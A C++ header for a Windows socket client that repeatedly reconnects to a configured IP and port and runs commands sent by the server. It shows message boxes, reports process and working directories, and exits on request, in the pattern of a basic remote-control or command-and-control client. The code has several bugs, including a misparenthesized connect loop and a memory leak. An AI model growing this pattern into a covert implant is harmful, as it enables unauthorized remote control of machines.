#pragma once
#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable: 4996)
#include <winsock2.h>
#include "utils.h"

class Client {
	SOCKADDR_IN addr{ 0 };
	SOCKET sock{ 0 };
	short size_addr = sizeof(addr);
	int connection_result;
	const char* IP;
	const short PORT;
public:
	Client(const char* ip, const short port) : IP(ip), PORT(port) {
		addr.sin_addr.s_addr = inet_addr(IP);
		addr.sin_port = htons(PORT);
		addr.sin_family = AF_INET;
		connect_client();
	}

	void message_handler()
	{
		const int size_buffer = 256;
		int recv_result = 0;

		while (sock != -1) {
			char* buffer = new char[size_buffer + 1]();
			buffer[size_buffer] = '\0';

			recv_result = recv(sock, buffer, size_buffer, 0);

			if (recv_result < 0) {	
				connection_result = -1;
				while (connect_client() != 0) {}
			}
			command_handler(buffer, size_buffer);
			delete[] buffer;
		}
	}

	void command_handler(std::string buffer, int size_buffer)
	{
		Win_Api::Procces* func = new Win_Api::Procces;
		std::string s1;
		std::string s2;

		auto pos = buffer.find(" ");

		if (pos != std::string::npos) {
			s1 = buffer.substr(0, pos);
			s2 = buffer.substr(pos + 1);
		}

		if (strcmp(s1.c_str(), "msg") == 0) {
			send(sock, "Message delivered.", 19, 0);
			MessageBox(0, s2.c_str(), MB_OK, 0);
		}

		else if (strcmp(s1.c_str(), "get_pdir") == 0) {
			send(sock, func->Get_Procc_Directory(s2.c_str()), strlen(func->Get_Procc_Directory(s2.c_str())), 0);
		}

		else if (strcmp(buffer.c_str(), "pwd") == 0) {
			send(sock, func->Pwd(), strlen(func->Pwd()), 0);					//Example Commands
		}
																		
		else if (strcmp(buffer.c_str(), "disc") == 0) {
			send(sock, "Client disconnected.", 20, 0);
			exit(0);
		}
		else {
			send(sock, " ", 1, 0);
		}
		delete func;
	}

	int connect_client()
	{
		WSAData wsaData;
		WORD DLLVersion = MAKEWORD(2, 1);

		if (WSAStartup(DLLVersion, &wsaData) != 0) {
			exit(1);
		}

		sock = socket(AF_INET, SOCK_STREAM, NULL);

		if (sock == INVALID_SOCKET) {
			system("pause");
			exit(1);
		}

		while (connection_result = connect(sock, (SOCKADDR*)&addr, size_addr) != 0) {}

		while (connection_result == 0) {
			message_handler();
			return 0;
		}
	}
};
